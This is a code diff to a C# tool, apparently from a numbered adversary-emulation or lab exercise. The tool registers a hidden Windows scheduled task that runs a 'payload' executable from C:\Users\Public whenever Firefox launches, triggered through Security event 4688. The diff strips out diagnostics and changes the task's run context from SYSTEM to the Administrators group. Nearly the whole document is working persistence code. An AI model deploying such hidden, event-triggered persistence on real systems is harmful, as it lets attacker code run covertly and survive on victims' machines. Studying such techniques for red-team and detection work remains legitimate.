@@ -10,39 +10,21 @@ namespace A06_3b_event_trigger_schtask_persist
         {
             try
             {
-                // --- DEBUG BLOCK 1: Validate Payload File Existence via Native IO ---
                 string payloadPath = @"C:\Users\Public\A06_3b_SampleApp.exe";
                 Console.WriteLine($"[*] Debug: Checking payload path: '{payloadPath}'...");
                 if (!File.Exists(payloadPath))
                 {
                     Console.WriteLine($"[-] PRE-REGISTRATION ERROR: Target payload binary was not found at '{payloadPath}'.");
-                    Console.WriteLine("    Ensure your A06_3b_SampleApp project is compiled and copied to this path before registering.");
                     return;
                 }
-                Console.WriteLine("[+] Debug: Payload path verification successful.");
 
-                // --- DEBUG BLOCK 2: Check for Windows Event Log Access ---
-                // We verify that the directory containing the Security event log files can be verified
-                // as an alternative to using the Eventing.Reader objects.
-                string systemEventLogPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), @"LogFiles");
-                Console.WriteLine("[*] Debug: Probing platform registration compatibility...");
-
-                // --- STANDARD REGISTRATION BLOCK ---
 #pragma warning disable CA1416
                 Type? taskSchedulerType = Type.GetTypeFromProgID("Schedule.Service");
 #pragma warning restore CA1416
-                if (taskSchedulerType == null)
-                {
-                    Console.WriteLine("[-] Could not find Schedule.Service COM object.");
-                    return;
-                }
+                if (taskSchedulerType == null) return;
 
                 dynamic? ts = Activator.CreateInstance(taskSchedulerType);
-                if (ts == null)
-                {
-                    Console.WriteLine("[-] Could not instantiate TaskScheduler instance.");
-                    return;
-                }
+                if (ts == null) return;
                 ts.Connect();
 
                 dynamic rootFolder = ts.GetFolder("\\");
@@ -51,7 +33,7 @@ namespace A06_3b_event_trigger_schtask_persist
                 {
                     rootFolder.DeleteTask("A06_3b_EventTriggerTask", 0);
                 }
-                catch (COMException) { /* Task didn't exist, ignore */ }
+                catch (COMException) { /* Ignore */ }
 
                 dynamic taskDef = ts.NewTask(0);
 
@@ -62,7 +44,7 @@ namespace A06_3b_event_trigger_schtask_persist
                 dynamic triggers = taskDef.Triggers;
                 dynamic trigger = triggers.Create(0); // TASK_TRIGGER_EVENT = 0
 
-                // XPath Subscription: Uses an absolute path comparison (No contains() functions)
+                // Strict XML structural format matching Windows exact parser expectations
                 string subscriptionXml = @"<QueryList><Query Id='0' Path='Security'><Select Path='Security'>*[System[EventID=4688]] and *[EventData[Data[@Name='NewProcessName']='C:\Program Files\Mozilla Firefox\firefox.exe']]</Select></Query></QueryList>";
 
                 trigger.Id = "FirefoxLaunchTrigger";
@@ -71,7 +53,6 @@ namespace A06_3b_event_trigger_schtask_persist
 
                 dynamic actions = taskDef.Actions;
                 dynamic action = actions.Create(0); // TASK_ACTION_EXEC = 0
-
                 action.Path = payloadPath;
 
                 dynamic settings = taskDef.Settings;
@@ -80,13 +61,15 @@ namespace A06_3b_event_trigger_schtask_persist
                 settings.Hidden = true;
 
                 Console.WriteLine("[*] Debug: Invoking RegisterTaskDefinition via COM interface...");
+
+                // CRITICAL ADJUSTMENT: Changed execution context configuration profile
                 dynamic registeredTask = rootFolder.RegisterTaskDefinition(
                     "A06_3b_EventTriggerTask",
                     taskDef,
                     6,                             // TASK_CREATE_OR_UPDATE
-                    "SYSTEM",
+                    "Builtin\\Administrators",     // Group Context with Security Log visibility privileges
                     Type.Missing,
-                    5,                             // TASK_LOGON_SERVICE_ACCOUNT
+                    4,                             // TASK_LOGON_GROUP (Allows token execution permissions)
                     Type.Missing
                 );
 
@@ -95,12 +78,6 @@ namespace A06_3b_event_trigger_schtask_persist
             catch (COMException ex)
             {
                 Console.WriteLine($"[-] COM Error registering task: {ex.Message} (HRESULT: 0x{ex.HResult:X8})");
-                if (ex.HResult == unchecked((int)0x80070002))
-                {
-                    Console.WriteLine("[*] Diagnosis: The Task Scheduler engine rejected a specific parameter path.");
-                    Console.WriteLine("    Ensure that your payload exists at the specified target destination and that");
-                    Console.WriteLine("    the Audit Policy on your machine allows monitoring of Event 4688.");
-                }
             }
             catch (Exception ex)
             {
